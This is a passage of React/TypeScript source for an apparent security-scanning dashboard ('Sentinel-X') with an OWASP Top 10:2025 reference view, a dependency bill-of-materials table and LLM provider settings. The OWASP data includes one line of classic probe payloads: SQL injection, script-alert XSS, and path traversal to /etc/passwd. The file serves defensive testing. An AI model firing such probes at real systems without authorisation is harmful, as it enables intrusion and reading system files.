                      <div>

                        <div style={{ fontSize: '13px', fontWeight: '600', color: agentInfo[agent]?.color }}>{agentInfo[agent]?.name || agent}</div>

                        <div style={{ fontSize: '11px', color: '#666' }}>{agentInfo[agent]?.description}</div>

                      </div>

                    </div>

                  ))}

                </div>

              </div>



              {/* OWASP Categories */}

              <div style={{ marginBottom: '16px' }}>

                <div style={{ fontSize: '12px', color: '#888', fontWeight: '600', marginBottom: '8px' }}>OWASP CATEGORIES</div>

                <div style={{ display: 'flex', gap: '8px' }}>

                  {scanResults.owaspCategories.map((cat: string) => (

                    <span key={cat} style={{ background: 'rgba(255,68,68,0.2)', color: '#ff4444', fontSize: '12px', fontWeight: '600', padding: '4px 12px', borderRadius: '4px' }}>{cat}</span>

                  ))}

                </div>

              </div>



              {/* Severity */}

              <div style={{ marginBottom: '16px' }}>

                <div style={{ fontSize: '12px', color: '#888', fontWeight: '600', marginBottom: '8px' }}>SEVERITY</div>

                <span style={{ 

                  background: scanResults.severity === 'critical' ? 'rgba(255,68,68,0.2)' : scanResults.severity === 'high' ? 'rgba(255,136,68,0.2)' : 'rgba(255,170,0,0.2)',

                  color: scanResults.severity === 'critical' ? '#ff4444' : scanResults.severity === 'high' ? '#ff8844' : '#ffaa00',

                  fontSize: '14px', fontWeight: '700', padding: '6px 16px', borderRadius: '4px', textTransform: 'uppercase'

                }}>

                  {scanResults.severity}

                </span>

              </div>



              {/* Test Payloads */}

              <div>

                <div style={{ fontSize: '12px', color: '#888', fontWeight: '600', marginBottom: '8px' }}>RECOMMENDED PAYLOADS</div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>

                  {scanResults.testPayloads.map((payload: string, i: number) => (

                    <code key={i} style={{ 

                      background: 'rgba(0,0,0,0.4)', 

                      color: '#00d4ff', 

                      fontSize: '11px', 

                      padding: '8px 12px', 

                      borderRadius: '4px',

                      fontFamily: 'monospace',

                      overflow: 'auto',

                      whiteSpace: 'nowrap'

                    }}>{payload}</code>

                  ))}

                </div>

              </div>

            </div>

          ) : (

            <div style={{ color: '#666', fontSize: '13px', textAlign: 'center', paddingTop: '80px' }}>

              Select a vulnerability type and click "Auto-Select Best Agent" to see recommendations

            </div>

          )}

        </div>

      </div>



      {/* Agent Info Grid */}

      <div style={{ marginTop: '24px' }}>

        <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px', color: '#888' }}>All Available Phase 5 Agents</h3>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: '12px' }}>

          {Object.entries(agentInfo).map(([id, info]) => (

            <div key={id} style={{

              background: 'rgba(15, 15, 26, 0.95)',

              border: `1px solid ${info.color}40`,

              borderRadius: '12px',

              padding: '16px',

              textAlign: 'center'

            }}>

              <div style={{ fontSize: '32px', marginBottom: '8px' }}>{info.icon}</div>

              <div style={{ fontSize: '13px', fontWeight: '600', color: info.color, marginBottom: '4px' }}>{info.name.split(' ')[1]}</div>

              <div style={{ fontSize: '10px', color: '#666' }}>{info.description.split(',')[0]}</div>

            </div>

          ))}

        </div>

      </div>

    </div>

  )

}



// ============ OWASP TOP 10:2025 KNOWLEDGE VIEW ============

function _OWASPKnowledgeView() {

  const owaspCategories = [

    { code: 'A01', name: 'Broken Access Control', icon: '🔓', color: '#ff4444', year: '2021→2025', description: 'Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data.', cwes: ['CWE-200', 'CWE-201', 'CWE-352', 'CWE-862', 'CWE-863', 'CWE-639'], patterns: ['IDOR', 'Force browsing', 'Privilege escalation', 'CORS misconfiguration'], detection: 'Check for missing authorization checks, predictable resource IDs, insecure direct object references' },

    { code: 'A02', name: 'Security Misconfiguration', icon: '⚙️', color: '#ff8844', year: '2021→2025', description: 'System, application, or cloud service is set up incorrectly from a security perspective. Includes missing hardening, unnecessary features, and verbose error messages.', cwes: ['CWE-16', 'CWE-611', 'CWE-489', 'CWE-526', 'CWE-547'], patterns: ['Default credentials', 'Missing patches', 'Verbose errors', 'Unnecessary features'], detection: 'Scan for debug endpoints, default creds, missing security headers, verbose stack traces' },

    { code: 'A03', name: 'Software Supply Chain Failures', icon: '📦', color: '#ffaa00', year: 'NEW 2025', description: 'Vulnerabilities in third-party components, dependencies, build pipeline, or software distribution. Includes malicious packages, dependency confusion, and CI/CD attacks.', cwes: ['CWE-1104', 'CWE-1391', 'CWE-1595', 'CWE-1411'], patterns: ['Malicious packages', 'Dependency confusion', 'Outdated dependencies', 'License violations'], detection: 'SBOM generation, CVE scanning, malicious package detection, license compliance' },

    { code: 'A04', name: 'Cryptographic Failures', icon: '🔐', color: '#00d4ff', year: '2021→2025', description: 'Weak or broken cryptography exposing sensitive data. Includes improper key management, weak algorithms, and plaintext transmission of sensitive data.', cwes: ['CWE-327', 'CWE-295', 'CWE-312', 'CWE-319', 'CWE-916', 'CWE-798'], patterns: ['Hardcoded secrets', 'Weak encryption', 'Plaintext transmission', 'Insecure random'], detection: 'Scan for API keys, passwords in code, MD5/SHA1 usage, HTTP instead of HTTPS' },

    { code: 'A05', name: 'Injection', icon: '💉', color: '#aa88ff', year: '2021→2025', description: 'Untrusted data sent to an interpreter as part of a command or query. Includes SQL, NoSQL, OS command, LDAP, XPath, and XSS injection.', cwes: ['CWE-79', 'CWE-89', 'CWE-78', 'CWE-90', 'CWE-643', 'CWE-94', 'CWE-95'], patterns: ['SQL injection', 'XSS', 'Command injection', 'Path traversal', 'SSTI'], detection: 'Fuzz with payloads like \' OR \'1\'=\'1, <script>alert(1)</script>, ../../../etc/passwd' },

    { code: 'A06', name: 'Insecure Design', icon: '🏗️', color: '#00ff88', year: '2021→2025', description: 'Missing or ineffective security controls in the application design. Includes business logic flaws, race conditions, and missing rate limiting.', cwes: ['CWE-330', 'CWE-341', 'CWE-400', 'CWE-641', 'CWE-830'], patterns: ['Race conditions', 'Business logic flaws', 'Missing rate limits', 'Flow manipulation'], detection: 'Behavioral analysis, concurrent request testing, workflow validation' },

    { code: 'A07', name: 'Authentication Failures', icon: '🔑', color: '#ff6688', year: '2021→2025', description: 'Authentication weaknesses allowing attackers to impersonate users. Includes credential stuffing, weak passwords, and session fixation.', cwes: ['CWE-287', 'CWE-259', 'CWE-384', 'CWE-307', 'CWE-521', 'CWE-798'], patterns: ['Credential stuffing', 'Weak passwords', 'Session fixation', 'Brute force'], detection: 'Test for missing rate limits, default creds, session token predictability' },

    { code: 'A08', name: 'Software or Data Integrity Failures', icon: '🔧', color: '#88ddff', year: '2021→2025', description: 'Code and infrastructure not protecting against integrity violations. Includes unsafe deserialization, CI/CD vulnerabilities, and dependency hijacking.', cwes: ['CWE-502', 'CWE-94', 'CWE-345', 'CWE-784', 'CWE-829'], patterns: ['Unsafe deserialization', 'CI/CD vulnerabilities', 'Code signing bypass', 'Dependency hijacking'], detection: 'Scan Jenkinsfiles, GitHub workflows, Dockerfiles for security issues' },

    { code: 'A09', name: 'Security Logging and Alerting Failures', icon: '📊', color: '#ffcc00', year: '2021→2025', description: 'Insufficient logging and monitoring for attack detection and response. Includes missing logs, log injection, and inadequate alerting.', cwes: ['CWE-778', 'CWE-223', 'CWE-117', 'CWE-532', 'CWE-73'], patterns: ['Missing audit logs', 'Log injection', 'Insufficient monitoring', 'Delayed alerts'], detection: 'Verify logging exists, check for log injection vulnerabilities, test alert triggers' },

    { code: 'A10', name: 'Mishandling of Exceptional Conditions', icon: '💥', color: '#ff4466', year: 'NEW 2025', description: 'Programs fail to prevent, detect, or respond to unusual situations. Includes error handling bugs, fail-open scenarios, and resource exhaustion.', cwes: ['CWE-209', 'CWE-234', 'CWE-274', 'CWE-476', 'CWE-636', 'CWE-248'], patterns: ['Error info leaks', 'Fail-open scenarios', 'Uncaught exceptions', 'Resource exhaustion'], detection: 'Check for verbose errors, missing timeouts, unhandled edge cases, denial of service' },

  ]



  const [selectedCategory, setSelectedCategory] = useState<string | null>(null)

  const selected = owaspCategories.find(c => c.code === selectedCategory)



  return (

    <div>

      {/* Header */}

      <div style={{ 

        background: 'linear-gradient(135deg, rgba(255, 136, 68, 0.15), rgba(255, 68, 136, 0.1))',

        borderRadius: '16px',

        padding: '24px',

        border: '1px solid rgba(255, 136, 68, 0.3)',

        marginBottom: '24px'

      }}>

        <div style={{ display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '12px' }}>

          <span style={{ fontSize: '40px' }}>📋</span>

          <div>

            <h2 style={{ fontSize: '28px', fontWeight: 'bold', background: 'linear-gradient(90deg, #ff8844, #ff4488)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>

              OWASP Top 10:2025

            </h2>

            <p style={{ fontSize: '13px', color: '#888' }}>Critical security risks for bug bounty hunting and vulnerability assessment</p>

          </div>

        </div>

        <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>

          <span style={{ background: 'rgba(255,68,68,0.2)', color: '#ff4444', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>2 NEW in 2025</span>

          <span style={{ background: 'rgba(0,212,255,0.2)', color: '#00d4ff', padding: '4px 12px', borderRadius: '4px', fontSize: '11px', fontWeight: '600' }}>A03, A10 are new categories</span>

        </div>

      </div>



      <div style={{ display: 'grid', gridTemplateColumns: selected ? '1fr 1fr' : '1fr', gap: '24px' }}>

        {/* Category Grid */}

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '12px' }}>

          {owaspCategories.map(cat => (

            <button

              key={cat.code}

              onClick={() => setSelectedCategory(selectedCategory === cat.code ? null : cat.code)}

              style={{

                background: selectedCategory === cat.code ? `${cat.color}25` : 'rgba(15, 15, 26, 0.95)',

                border: `2px solid ${selectedCategory === cat.code ? cat.color : 'rgba(255,255,255,0.05)'}`,

                borderRadius: '12px',

                padding: '16px',

                cursor: 'pointer',

                textAlign: 'left',

                transition: 'all 0.2s'

              }}

              onMouseEnter={(e) => {

                if (selectedCategory !== cat.code) {

                  e.currentTarget.style.borderColor = `${cat.color}50`

                }

              }}

              onMouseLeave={(e) => {

                if (selectedCategory !== cat.code) {

                  e.currentTarget.style.borderColor = 'rgba(255,255,255,0.05)'

                }

              }}

            >

              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '8px' }}>

                <span style={{ fontSize: '24px' }}>{cat.icon}</span>

                <div>

                  <span style={{ fontSize: '14px', fontWeight: 'bold', color: cat.color }}>{cat.code}</span>

                  <span style={{ fontSize: '11px', color: cat.year.startsWith('NEW') ? '#00ff88' : '#666', marginLeft: '8px' }}>{cat.year}</span>

                </div>

              </div>

              <h4 style={{ fontSize: '14px', fontWeight: '600', color: '#fff', marginBottom: '4px' }}>{cat.name}</h4>

              <p style={{ fontSize: '11px', color: '#666', marginBottom: '8px' }}>{cat.description.substring(0, 80)}...</p>

              <div style={{ display: 'flex', gap: '4px', flexWrap: 'wrap' }}>

                {cat.cwes.slice(0, 3).map(cwe => (

                  <span key={cwe} style={{ background: `${cat.color}15`, color: cat.color, fontSize: '9px', padding: '2px 6px', borderRadius: '3px' }}>{cwe}</span>

                ))}

              </div>

            </button>

          ))}

        </div>



        {/* Detail Panel */}

        {selected && (

          <div style={{ 

            background: 'rgba(15, 15, 26, 0.95)',

            borderRadius: '16px',

            padding: '24px',

            border: `2px solid ${selected.color}`

          }}>

            <div style={{ display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '20px' }}>

              <span style={{ fontSize: '48px' }}>{selected.icon}</span>

              <div>

                <span style={{ fontSize: '14px', fontWeight: 'bold', color: selected.color }}>{selected.code}</span>

                <h3 style={{ fontSize: '24px', fontWeight: 'bold', color: '#fff' }}>{selected.name}</h3>

                <span style={{ fontSize: '11px', color: selected.year.startsWith('NEW') ? '#00ff88' : '#888' }}>{selected.year}</span>

              </div>

            </div>

            

            <p style={{ fontSize: '13px', color: '#aaa', marginBottom: '20px', lineHeight: '1.6' }}>{selected.description}</p>

            

            <div style={{ marginBottom: '20px' }}>

              <h4 style={{ fontSize: '13px', fontWeight: '600', color: '#888', marginBottom: '8px' }}>CWEs (Common Weakness Enumerations)</h4>

              <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap' }}>

                {selected.cwes.map(cwe => (

                  <span key={cwe} style={{ background: `${selected.color}20`, color: selected.color, fontSize: '11px', padding: '4px 10px', borderRadius: '4px', fontFamily: 'monospace' }}>{cwe}</span>

                ))}

              </div>

            </div>

            

            <div style={{ marginBottom: '20px' }}>

              <h4 style={{ fontSize: '13px', fontWeight: '600', color: '#888', marginBottom: '8px' }}>Attack Patterns</h4>

              <div style={{ display: 'flex', gap: '6px', flexWrap: 'wrap' }}>

                {selected.patterns.map(p => (

                  <span key={p} style={{ background: 'rgba(255,255,255,0.05)', color: '#00d4ff', fontSize: '11px', padding: '4px 10px', borderRadius: '4px' }}>{p}</span>

                ))}

              </div>

            </div>

            

            <div style={{ 

              background: 'rgba(0,0,0,0.3)',

              borderRadius: '8px',

              padding: '16px',

              border: `1px solid ${selected.color}30`

            }}>

              <h4 style={{ fontSize: '12px', fontWeight: '600', color: selected.color, marginBottom: '8px' }}>🔍 Detection in Sentinel-X</h4>

              <p style={{ fontSize: '12px', color: '#888', lineHeight: '1.5' }}>{selected.detection}</p>

            </div>

          </div>

        )}

      </div>

    </div>

  )

}



// ============ SUPPLY CHAIN VIEW ============

function _SupplyChainView() {

  const [sbom] = useState<SBOMEntry[]>([

    { name: 'lodash', version: '4.17.21', license: 'MIT', vulnerabilities: ['CVE-2021-23337'], risk_score: 7.2 },

    { name: 'axios', version: '0.21.1', license: 'MIT', vulnerabilities: [], risk_score: 2.1 },

    { name: 'express', version: '4.17.1', license: 'MIT', vulnerabilities: ['CVE-2022-24999'], risk_score: 5.5 },

    { name: 'react', version: '17.0.2', license: 'MIT', vulnerabilities: [], risk_score: 1.2 },

    { name: 'ws', version: '7.4.3', license: 'MIT', vulnerabilities: [], risk_score: 0.8 },

  ])



  const getRiskColor = (score: number) => {

    if (score >= 7) return '#ff4444'

    if (score >= 4) return '#ff8844'

    if (score >= 2) return '#ffaa00'

    return '#00ff88'

  }



  return (

    <div>

      {/* Supply Chain Stats */}

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '16px', marginBottom: '24px' }}>

        <StatCard label="Total Dependencies" value={sbom.length.toString()} icon="📦" color="#00d4ff" />

        <StatCard label="Vulnerable" value={sbom.filter(s => s.vulnerabilities.length > 0).length.toString()} icon="⚠️" color="#ff8844" />

        <StatCard label="High Risk" value={sbom.filter(s => s.risk_score >= 7).length.toString()} icon="🚨" color="#ff4444" />

        <StatCard label="License Issues" value="0" icon="📋" color="#00ff88" />

      </div>



      {/* Actions */}

      <div style={{ 

        background: 'rgba(15, 15, 26, 0.95)',

        borderRadius: '16px',

        padding: '24px',

        border: '1px solid rgba(255,255,255,0.05)',

        marginBottom: '24px'

      }}>

        <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px' }}>SBOM Actions</h3>

        <div style={{ display: 'flex', gap: '12px' }}>

          <button style={{

            background: 'linear-gradient(135deg, #00d4ff, #00ff88)',

            border: 'none',

            color: '#000',

            padding: '12px 20px',

            borderRadius: '8px',

            cursor: 'pointer',

            fontSize: '13px',

            fontWeight: '700'

          }}>

            📦 Generate SBOM

          </button>

          <button style={{

            background: 'rgba(255,255,255,0.05)',

            border: '1px solid rgba(255,255,255,0.1)',

            color: '#888',

            padding: '12px 20px',

            borderRadius: '8px',

            cursor: 'pointer',

            fontSize: '13px'

          }}>

            📊 Export SPDX

          </button>

          <button style={{

            background: 'rgba(255,255,255,0.05)',

            border: '1px solid rgba(255,255,255,0.1)',

            color: '#888',

            padding: '12px 20px',

            borderRadius: '8px',

            cursor: 'pointer',

            fontSize: '13px'

          }}>

            🔍 Scan Vulnerabilities

          </button>

        </div>

      </div>



      {/* SBOM Table */}

      <div style={{ 

        background: 'rgba(15, 15, 26, 0.95)',

        borderRadius: '16px',

        padding: '24px',

        border: '1px solid rgba(255,255,255,0.05)'

      }}>

        <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px' }}>Software Bill of Materials</h3>

        <table style={{ width: '100%', borderCollapse: 'collapse' }}>

          <thead>

            <tr style={{ borderBottom: '1px solid rgba(255,255,255,0.05)' }}>

              <th style={{ textAlign: 'left', padding: '12px', color: '#666', fontSize: '12px', fontWeight: '600' }}>Package</th>

              <th style={{ textAlign: 'left', padding: '12px', color: '#666', fontSize: '12px', fontWeight: '600' }}>Version</th>

              <th style={{ textAlign: 'left', padding: '12px', color: '#666', fontSize: '12px', fontWeight: '600' }}>License</th>

              <th style={{ textAlign: 'left', padding: '12px', color: '#666', fontSize: '12px', fontWeight: '600' }}>Vulnerabilities</th>

              <th style={{ textAlign: 'left', padding: '12px', color: '#666', fontSize: '12px', fontWeight: '600' }}>Risk Score</th>

            </tr>

          </thead>

          <tbody>

            {sbom.map((entry, i) => (

              <tr key={i} style={{ borderBottom: '1px solid rgba(255,255,255,0.03)' }}>

                <td style={{ padding: '16px 12px', fontSize: '14px', fontWeight: '600' }}>{entry.name}</td>

                <td style={{ padding: '16px 12px', fontSize: '13px', color: '#00d4ff', fontFamily: 'monospace' }}>{entry.version}</td>

                <td style={{ padding: '16px 12px', fontSize: '12px', color: '#888' }}>{entry.license}</td>

                <td style={{ padding: '16px 12px' }}>

                  {entry.vulnerabilities.length > 0 ? (

                    <span style={{ 

                      background: 'rgba(255, 68, 68, 0.1)', 

                      color: '#ff4444', 

                      fontSize: '11px', 

                      fontWeight: '600',

                      padding: '4px 8px',

                      borderRadius: '4px'

                    }}>

                      {entry.vulnerabilities.length} CVE{entry.vulnerabilities.length > 1 ? 's' : ''}

                    </span>

                  ) : (

                    <span style={{ color: '#00ff88', fontSize: '12px' }}>✓ None</span>

                  )}

                </td>

                <td style={{ padding: '16px 12px' }}>

                  <span style={{

                    background: `${getRiskColor(entry.risk_score)}20`,

                    color: getRiskColor(entry.risk_score),

                    fontSize: '13px',

                    fontWeight: '600',

                    padding: '4px 12px',

                    borderRadius: '4px'

                  }}>

                    {entry.risk_score.toFixed(1)}

                  </span>

                </td>

              </tr>

            ))}

          </tbody>

        </table>

      </div>

    </div>

  )

}



// ============ SETUP VIEW ============

function SetupView({ configuredProviders, onProviderConfigured }: { 

  configuredProviders: Set<string>;

  onProviderConfigured: (providerId: string) => void;

}) {

  const [selectedProvider, setSelectedProvider] = useState('openai')

  const [apiKey, setApiKey] = useState('')

  const [baseUrl, setBaseUrl] = useState('')

  const [model, setModel] = useState('')

  const [testStatus, setTestStatus] = useState<{type: 'none' | 'success' | 'error', message: string}>({type: 'none', message: ''})

  const [saved, setSaved] = useState(false)

  const [isTesting, setIsTesting] = useState(false)



  const providers = [

    { id: 'openai', name: 'OpenAI', defaultUrl: 'https://api.openai.com/v1', placeholder: 'sk-...', models: ['gpt-4o', 'gpt-4o-mini', 'gpt-4-turbo', 'gpt-3.5-turbo', 'o1', 'o1-mini'] },

    { id: 'anthropic', name: 'Anthropic', defaultUrl: 'https://api.anthropic.com', placeholder: 'sk-ant-api...', models: ['claude-3.5-sonnet-20241022', 'claude-3.5-haiku-20241022', 'claude-3-opus-20240229'] },

    { id: 'groq', name: 'Groq', defaultUrl: 'https://api.groq.com/openai/v1', placeholder: 'gsk_...', models: ['llama-3.3-70b-versatile', 'llama-3.1-70b-versatile', 'llama-3.1-8b-instant', 'mixtral-8x7b-32768'] },

    { id: 'openrouter', name: 'OpenRouter', defaultUrl: 'https://openrouter.ai/api/v1', placeholder: 'sk-or-...', models: ['openrouter/auto', 'meta-llama/llama-3.3-70b-instruct', 'google/gemini-2.0-flash-exp'] },

    { id: 'ollama', name: 'Ollama (Local)', defaultUrl: 'http://localhost:11434/v1', placeholder: 'not-required', models: ['llama3.3', 'llama3.2', 'mistral', 'codellama'] },

    { id: 'gemini', name: 'Google Gemini', defaultUrl: 'https://generativelanguage.googleapis.com', placeholder: 'AIza...', models: ['gemini-1.5-pro', 'gemini-1.5-flash', 'gemini-2.0-flash-exp'] },

    { id: 'mistral', name: 'Mistral AI', defaultUrl: 'https://api.mistral.ai/v1', placeholder: '...', models: ['mistral-large-latest', 'mistral-medium-latest', 'mistral-small-latest'] },

    { id: 'lmstudio', name: 'LM Studio (Local)', defaultUrl: 'http://localhost:1234/v1', placeholder: 'not-required', models: ['llama3.1', 'llama3.2', 'mistral', 'codellama'] },

    { id: 'vllm', name: 'vLLM (Local)', defaultUrl: 'http://localhost:8000/v1', placeholder: 'not-required', models: ['llama3.1', 'mixtral', 'qwen2'] },

    { id: 'opencode', name: 'OpenCode (Self-hosted)', defaultUrl: 'http://localhost:8080', placeholder: 'not-required', models: ['auto'] },

    { id: 'local', name: 'Local/Custom', defaultUrl: 'http://localhost:11434/v1', placeholder: 'not-required', models: ['auto'] },

  ]



  const currentProvider = providers.find(p => p.id === selectedProvider) || providers[0]



  const handleProviderChange = (providerId: string) => {

    setSelectedProvider(providerId)

    const provider = providers.find(p => p.id === providerId)

    if (provider) {

      setBaseUrl(provider.defaultUrl)

      setModel(provider.models[0])

    }

    setTestStatus({type: 'none', message: ''})

  }



  const handleSave = async () => {

    try {

      const res = await fetch('/api/config/save-key', {

        method: 'POST',

        headers: { 'Content-Type': 'application/json' },

        body: JSON.stringify({

          provider: selectedProvider,

          api_key: apiKey,

          base_url: baseUrl

        }),

      })

      const data = await res.json()

      if (data.status === 'ok') {

        setSaved(true)

        onProviderConfigured(selectedProvider)

        setTimeout(() => setSaved(false), 2000)

      }

    } catch (e) {

      console.error('Failed to save API key:', e)

    }

  }



  const handleTest = async () => {

    if (!apiKey && selectedProvider !== 'ollama') {

      setTestStatus({type: 'error', message: 'Please enter an API key'})

      return

    }

    

    setIsTesting(true)

    setTestStatus({type: 'none', message: ''})

    try {

      const res = await fetch('/api/config/test?' + new URLSearchParams({

        provider: selectedProvider,

        base_url: baseUrl,

      }), {

        method: 'POST',

        headers: { 'Content-Type': 'application/json' },

        body: JSON.stringify({ api_key: apiKey, model: model }),

      })

      

      if (!res.ok) {

        const text = await res.text()

        setTestStatus({type: 'error', message: `❌ HTTP ${res.status}: ${text.substring(0, 200)}`})

        return

      }

      

      const data = await res.json()

      if (data.status === 'ok') {

        setTestStatus({type: 'success', message: `✅ Connected! Model: ${data.model || model}, Latency: ${Math.round(data.latency_ms)}ms`})

      } else {

        setTestStatus({type: 'error', message: `❌ ${data.error}`})

      }

    } catch (e) {

      setTestStatus({type: 'error', message: `❌ Failed: ${e}`})

    } finally {

      setIsTesting(false)

    }

  }



  useEffect(() => {

    handleProviderChange('openai')

  }, [])



  return (

    <div>

      <h2 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '8px' }}>⚙️ Settings</h2>

      <p style={{ color: '#666', marginBottom: '32px' }}>Configure your LLM provider to enable AI-powered security analysis</p>



      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '32px' }}>

        {/* Left Column */}

        <div style={{ background: 'rgba(15, 15, 26, 0.95)', borderRadius: '16px', padding: '24px', border: '1px solid rgba(255,255,255,0.05)' }}>

          <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '20px' }}>Provider Configuration</h3>

          

          <div style={{ marginBottom: '20px' }}>

            <label style={{ display: 'block', marginBottom: '8px', color: '#888', fontSize: '13px' }}>Provider</label>

            <select

              value={selectedProvider}

              onChange={(e) => handleProviderChange(e.target.value)}

              style={{

                width: '100%',

                background: 'rgba(0,0,0,0.3)',

                border: '1px solid rgba(255,255,255,0.1)',

                borderRadius: '8px',

                padding: '12px',

                color: '#fff',

                fontSize: '14px'

              }}

            >

              {providers.map(p => (

                <option key={p.id} value={p.id}>{p.name}</option>

              ))}

            </select>

          </div>



          <div style={{ marginBottom: '20px' }}>

            <label style={{ display: 'block', marginBottom: '8px', color: '#888', fontSize: '13px' }}>Model</label>

            <select

              value={model}

              onChange={(e) => setModel(e.target.value)}

              style={{

                width: '100%',

                background: 'rgba(0,0,0,0.3)',

                border: '1px solid rgba(255,255,255,0.1)',

                borderRadius: '8px',

                padding: '12px',

                color: '#00d4ff',

                fontSize: '14px',

                fontFamily: 'monospace'

              }}

            >

              {currentProvider.models.map(m => (

                <option key={m} value={m}>{m}</option>

              ))}

            </select>

          </div>



          <div style={{ marginBottom: '20px' }}>

            <label style={{ display: 'block', marginBottom: '8px', color: '#888', fontSize: '13px' }}>API Key</label>

            <input

              type="password"

              value={apiKey}

              onChange={(e) => setApiKey(e.target.value)}

              placeholder={currentProvider.placeholder}

              style={{

                width: '100%',

                background: 'rgba(0,0,0,0.3)',

                border: '1px solid rgba(255,255,255,0.1)',

                borderRadius: '8px',

                padding: '12px',

                color: '#fff',

                fontSize: '14px'

              }}

            />

          </div>



          <div style={{ marginBottom: '24px' }}>

            <label style={{ display: 'block', marginBottom: '8px', color: '#888', fontSize: '13px' }}>Base URL</label>

            <input

              type="text"

              value={baseUrl}

              onChange={(e) => setBaseUrl(e.target.value)}

              style={{

                width: '100%',

                background: 'rgba(0,0,0,0.3)',

                border: '1px solid rgba(255,255,255,0.1)',

                borderRadius: '8px',

                padding: '12px',

                color: '#fff',

                fontSize: '14px',

                fontFamily: 'monospace'

              }}

            />

          </div>



          <div style={{ display: 'flex', gap: '12px' }}>

            <button

              onClick={handleTest}

              disabled={isTesting || (!apiKey && selectedProvider !== 'ollama')}

              style={{

                flex: 1,

                background: 'rgba(0, 212, 255, 0.1)',

                color: apiKey || selectedProvider === 'ollama' ? '#00d4ff' : '#666',

                border: '1px solid #00d4ff',

                borderRadius: '8px',

                padding: '12px',

                cursor: (apiKey || selectedProvider === 'ollama') ? 'pointer' : 'not-allowed',

                fontSize: '13px',

                fontWeight: '600'

              }}

            >

              {isTesting ? 'Testing...' : 'Test Connection'}

            </button>

            <button

              onClick={handleSave}

              disabled={!apiKey && selectedProvider !== 'ollama'}

              style={{

                flex: 1,

                background: saved ? '#00ff88' : 'linear-gradient(135deg, #00d4ff, #00ff88)',

                color: '#000',

                border: 'none',

                borderRadius: '8px',

                padding: '12px',

                fontWeight: '700',

                cursor: (apiKey || selectedProvider === 'ollama') ? 'pointer' : 'not-allowed',

                fontSize: '13px'

              }}

            >

              {saved ? '✓ Saved!' : 'Save'}

            </button>

          </div>



          {testStatus.message && (

            <div style={{

              marginTop: '16px',

              padding: '12px',

              background: testStatus.type === 'success' ? 'rgba(0, 255, 136, 0.1)' : 'rgba(255, 68, 68, 0.1)',

              borderRadius: '8px',

              fontSize: '13px',

              border: `1px solid ${testStatus.type === 'success' ? '#00ff88' : '#ff4444'}`

            }}>

              {testStatus.message}

            </div>

          )}

        </div>



        {/* Right Column */}

        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>

          <div style={{ background: 'rgba(15, 15, 26, 0.95)', borderRadius: '16px', padding: '24px', border: '1px solid rgba(255,255,255,0.05)' }}>

            <h3 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '16px' }}>Configured Providers</h3>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>

              {providers.map(p => {

                const isConfigured = configuredProviders.has(p.id)

                return (

                  <div key={p.id} style={{

                    display: 'flex',

                    justifyContent: 'space-between',

                    alignItems: 'center',

                    padding: '12px',

                    background: selectedProvider === p.id ? 'rgba(0, 212, 255, 0.1)' : 'rgba(0,0,0,0.2)',

                    borderRadius: '8px',

                    border: selectedProvider === p.id ? '1px solid #00d4ff' : '1px solid transparent',

                    cursor: 'pointer'

                  }}

                  onClick={() => setSelectedProvider(p.id)}>

                    <span style={{ fontWeight: '500' }}>{p.name}</span>

                    {isConfigured ? (

                      <span style={{ fontSize: '11px', color: '#00ff88' }}>● Configured</span>

                    ) : (

                      <span style={{ fontSize: '11px', color: '#666' }}>○ Not configured</span>

                    )}

                  </div>

                )

              })}

            </div>

          </div>



          <div style={{ 

            background: 'linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(0, 255, 136, 0.05))',

            borderRadius: '16px',

            padding: '24px',

            border: '1px solid rgba(0, 212, 255, 0.2)'

          }}>

            <h3 style={{ fontSize: '14px', fontWeight: '600', marginBottom: '12px' }}>💡 Tips</h3>

            <ul style={{ fontSize: '12px', color: '#888', listStyle: 'none', padding: 0, margin: 0 }}>

              <li style={{ marginBottom: '8px' }}>• Groq offers free tier with llama-3.1 models</li>

              <li style={{ marginBottom: '8px' }}>• OpenRouter provides access to 100+ models</li>

              <li style={{ marginBottom: '8px' }}>• Ollama runs locally - no API key needed</li>

              <li>• API keys are stored in memory only</li>

            </ul>

          </div>

        </div>

      </div>

    </div>

  )

}



// ============ MODEL CONFIG VIEW ============

function ModelConfigView({ }: { configuredProviders?: Set<string> }) {

  const [agentConfigs, setAgentConfigs] = useState<AgentModelConfig>({

    'recon': 'claude-3.5-sonnet-20241022',

    'code-review': 'claude-3.5-sonnet-20241022',

    'threat-modeling': 'claude-3.5-sonnet-20241022',

    'dependency': 'claude-3.5-sonnet-20241022',

    'debate': 'claude-3.5-sonnet-20241022',

    'remediation': 'claude-3.5-sonnet-20241022'

  })

  const [loading, setLoading] = useState(false)



  const agents = [

    { id: 'recon', name: '🎯 Recon Agent', description: 'Target discovery, port scanning, OSINT' },

    { id: 'code-review', name: '🔍 Code Review Agent', description: 'SAST with security pattern detection' },

    { id: 'threat-modeling', name: '🛡️ Threat Modeling Agent', description: 'Attack path analysis using knowledge graph' },

    { id: 'dependency', name: '📦 Dependency Agent', description: 'Vulnerability scanning for dependencies' },

    { id: 'debate', name: '⚖️ Debate Engine', description: '5-role adversarial finding validation' },

    { id: 'remediation', name: '🔧 Remediation Agent', description: 'Automated remediation planning' },

  ]



  const models = [

